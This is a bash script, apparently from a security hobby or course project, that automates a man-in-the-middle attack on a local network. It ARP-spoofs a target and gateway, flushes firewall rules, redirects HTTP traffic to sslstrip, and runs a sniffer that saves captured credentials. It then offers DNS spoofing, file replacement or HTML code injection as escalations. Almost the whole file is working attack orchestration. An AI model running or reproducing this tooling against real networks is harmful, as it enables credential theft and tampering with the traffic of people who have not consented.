#!/bin/bash

trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT

GREEN='\033[1;32m'
CYAN='\033[0;36m'
NOCOLOR='\033[0m'


echo -e "${CYAN}\n███╗   ███╗███████╗    ██╗███╗   ██╗    ████████╗██╗  ██╗███████╗    ███╗   ███╗██╗██████╗ ██████╗ ██╗     ███████"
echo -e "████╗ ████║██╔════╝    ██║████╗  ██║    ╚══██╔══╝██║  ██║██╔════╝    ████╗ ████║██║██╔══██╗██╔══██╗██║     ██╔════╝"
echo -e "██╔████╔██║█████╗      ██║██╔██╗ ██║       ██║   ███████║█████╗      ██╔████╔██║██║██║  ██║██║  ██║██║     █████╗  "
echo -e "██║╚██╔╝██║██╔══╝      ██║██║╚██╗██║       ██║   ██╔══██║██╔══╝      ██║╚██╔╝██║██║██║  ██║██║  ██║██║     ██╔══╝  "
echo -e "██║ ╚═╝ ██║███████╗    ██║██║ ╚████║       ██║   ██║  ██║███████╗    ██║ ╚═╝ ██║██║██████╔╝██████╔╝███████╗███████╗"
echo -e "╚═╝     ╚═╝╚══════╝    ╚═╝╚═╝  ╚═══╝       ╚═╝   ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝╚═════╝ ╚═════╝ ╚══════╝╚══════╝${NOCOLOR}\n"

echo "Copyright 2020 - Gavin Edgerton and Luke Williams"

#define functions and variables for some ASCII art

spinner=( '|' '/' '-' '\')

copy(){
    spin &
    pid=$!

#    for i in `seq 1 10`
#    do
        sleep 1.8
#    done

    kill $pid
    echo -ne "\u001b[{1}F\u001b[2K"
    echo ""
}

spin(){
    while [ 1 ]
    do
        for i in "${spinner[@]}"
        do
             echo -ne "\r$i$i$i"
             sleep 0.2
        done
     done
}


#
MYIP=$(ip route | grep src | cut -d ' ' -f 9)

echo "1" > /proc/sys/net/ipv4/ip_forward

if [[ -z $1 ]] || [[ -n $3 ]]
then
read -p "Enter a subnet to scan: " TARGET_SUBNET

./ARP_netscan.py $TARGET_SUBNET && TARGET_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 1) && GATEWAY_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 2)

#echo "Ex: /main.sh 10.0.2.0/24 where <subnet> is the subnet you want to scan."
#echo "Alternate usage; ./main.sh <target-ip> <gateway-ip> to skip the scan and go directly to an attack."

elif [[ -n $1 ]] && [[ -z $2 ]]
then
./ARP_netscan.py $1 && TARGET_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 1) && GATEWAY_IP=$(cat /tmp/mitm.txt | cut -d' ' -f 2)
copy

elif [[ -n $1 ]] && [[ -n $2 ]]
then
TARGET_IP=$1
GATEWAY_IP=$2
fi

echo "Spoofing target ${TARGET_IP} and gateway router ${GATEWAY_IP}"
copy
#run the ARP spoofing script
./arp_spoof.py $TARGET_IP $GATEWAY_IP >> /tmp/arp_log.txt &

echo -e "${GREEN}\nSuccess. You are now the any-gendered person in the middle.${NOCOLOR}"
copy

echo -e "Updating firewall rules to forward intercepted webrequests to sslstrip"

sleep 1

iptables -F

copy

iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

echo -e "Starting sslstrip 0.9 by Moxie Marlinspike"
copy

sslstrip > /dev/null 2> /dev/null &

INTERFACE=$(ip route | grep default | cut -d ' ' -f 5)

echo -e "Starting packet sniffer on interface ${INTERFACE}"
copy

#DATE=$(date | tr ' ' '-')

#FILENAME="./packet-output-${DATE}"

#echo "Please give full path to output file for any credentials found during packet sniff: "

#read OUTFILE

./packet_sniffer.py $INTERFACE &

echo -e "${GREEN}Packet sniffing in progress. Any credentials detected over the wire will be saved in ./output.txt\n\n${NOCOLOR}---------------------------------------------------\n"
echo -e "Would you like to escalate the attack?"
#selecting DNS Spoofing ends the sslstrip currently in progress
echo -e "1. DNS Spoofing"
echo "2. File Replacement"
echo -e "3. Code Injection\n"
read -p ">>" USERNUMBER

if [[ $USERNUMBER == '1' ]]
then

sslstrip_pid=$(ps -aux | grep sslstrip | grep -v 'grep' | awk '{ print $2 }')
kill $sslstrip_pid

echo "Updating firewall rules to forward packets to and from NFQUEUE..."

#iptables -t nat -F && iptables -I INPUT -j NFQUEUE --queue-num 0 && iptables -I OUTPUT -j NFQUEUE --queue-num 0

iptables -t nat -F && iptables -I FORWARD -j NFQUEUE --queue-num 0

sleep 1

echo "Complete."

./dns_spoof.py $MYIP 2>/dev/null

elif [[ $USERNUMBER == '2' ]]
then

echo "Updating firewall rules to forward packets to and from NFQUEUE..."

iptables -F && iptables -I INPUT -j NFQUEUE --queue-num 0 && iptables -I OUTPUT -j NFQUEUE --queue-num 0

sleep 1

echo "Complete."


./file_replacer.py

elif [[ $USERNUMBER == '3' ]]
then

iptables -F && iptables -I INPUT -j NFQUEUE --queue-num 0 && iptables -I OUTPUT -j NFQUEUE --queue-num 0

echo "Waiting for target to open HTML files..."

./code_injector.py

else
echo "Please enter 1, 2, or 3"

fi

while true
do
sleep 10
done

